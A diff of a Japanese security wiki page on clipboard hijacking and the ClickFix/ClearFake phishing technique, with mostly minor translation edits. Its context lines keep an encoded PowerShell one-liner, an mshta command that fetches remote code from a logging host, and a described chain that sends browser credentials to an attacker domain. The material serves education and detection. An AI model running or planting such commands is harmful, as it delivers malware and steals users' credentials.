@@ -4,11 +4,11 @@
 
 > "自分でコピーしていないものは絶対に貼り付けないこと。" – 古いが今でも有効なアドバイス
 
-## 概要
+## Overview
 
-Clipboard hijacking – 別名 *pastejacking* – は、ユーザーがコマンドを検査せずに日常的にコピー＆ペーストする事実を悪用します。悪意のあるウェブページ（またはElectronやデスクトップアプリケーションなどのJavaScript対応コンテキスト）は、攻撃者が制御するテキストをプログラム的にシステムクリップボードに配置します。被害者は、通常は巧妙に作成されたソーシャルエンジニアリングの指示によって、**Win + R**（実行ダイアログ）、**Win + X**（クイックアクセス / PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*貼り付け*し、任意のコマンドを即座に実行するように促されます。
+Clipboard hijacking – 別名 *pastejacking* – は、ユーザーがコマンドを検査せずに日常的にコピー＆ペーストする事実を悪用します。悪意のあるウェブページ（またはElectronやデスクトップアプリケーションなどのJavaScript対応コンテキスト）は、攻撃者が制御するテキストをプログラム的にシステムクリップボードに配置します。被害者は、通常は巧妙に作成されたソーシャルエンジニアリングの指示によって、**Win + R**（実行ダイアログ）、**Win + X**（クイックアクセス / PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*貼り付け*、任意のコマンドを即座に実行するように促されます。
 
-**ファイルはダウンロードされず、添付ファイルも開かれないため**、この手法は添付ファイル、マクロ、または直接コマンド実行を監視するほとんどのメールおよびウェブコンテンツのセキュリティ制御を回避します。したがって、この攻撃はNetSupport RAT、Latrodectusローダー、またはLumma Stealerなどのコモディティマルウェアファミリーを配信するフィッシングキャンペーンで人気があります。
+**ファイルはダウンロードされず、添付ファイルは開かれないため**、この手法は添付ファイル、マクロ、または直接コマンド実行を監視するほとんどのメールおよびウェブコンテンツのセキュリティ制御を回避します。したがって、この攻撃はNetSupport RAT、Latrodectusローダー、またはLumma Stealerなどのコモディティマルウェアファミリーを配信するフィッシングキャンペーンで人気があります。
 
 ## JavaScript Proof-of-Concept
 ```html
@@ -26,7 +26,7 @@ navigator.clipboard.writeText(payload)
 
 ## ClickFix / ClearFake フロー
 
-1. ユーザーがタイポスクワッティングされたか、侵害されたサイト（例: `docusign.sa[.]com`）を訪れます。
+1. ユーザーがタイポスクワッティングされたまたは侵害されたサイト（例: `docusign.sa[.]com`）を訪れます。
 2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、静かにBase64エンコードされたPowerShellワンライナーをクリップボードに保存します。
 3. HTMLの指示が被害者に次のように伝えます: *“**Win + R** を押し、コマンドを貼り付けてEnterを押して問題を解決してください。”*
 4. `powershell.exe` が実行され、正当な実行可能ファイルと悪意のあるDLLを含むアーカイブをダウンロードします（クラシックDLLサイドローディング）。
@@ -55,7 +55,7 @@ powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-**mshta** コールは、`PartyContinued.exe` を取得し、`Boat.pst` (CAB) を抽出し、`extrac32` とファイル連結を通じて `AutoIt3.exe` を再構築し、最終的にブラウザの資格情報を `sumeriavgv.digital` に流出させる `.a3x` スクリプトを実行する隠れた PowerShell スクリプトを起動します。
+**mshta** コールは、`PartyContinued.exe` を取得し、`Boat.pst` (CAB) を抽出し、`extrac32` とファイルの連結を通じて `AutoIt3.exe` を再構築し、最終的にブラウザの資格情報を `sumeriavgv.digital` に外部送信する `.a3x` スクリプトを実行する隠れた PowerShell スクリプトを起動します。
 
 ## 検出とハンティング
 
@@ -76,6 +76,7 @@ mshta https://iplogger.co/xxxx =+\\xxx
 ## 関連トリック
 
 * **Discord 招待ハイジャック** は、ユーザーを悪意のあるサーバーに誘導した後、同じ ClickFix アプローチを悪用することがよくあります：
+
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
